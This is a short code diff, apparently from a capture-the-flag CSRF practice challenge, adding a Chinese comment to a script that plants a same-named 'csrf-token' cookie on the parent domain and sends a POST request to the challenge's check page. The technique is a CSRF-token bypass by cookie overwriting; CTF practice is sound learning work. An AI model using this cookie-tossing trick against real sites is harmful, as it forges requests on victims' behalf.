@@ -1,4 +1,5 @@
 document.cookie ="csrf-token=123; path=/csrf/; domain=.w2nd.me";
+//添加了一条同名cookie
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "http://ctf.w2nd.me/csrf/practice4/check.php", true);
 // xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
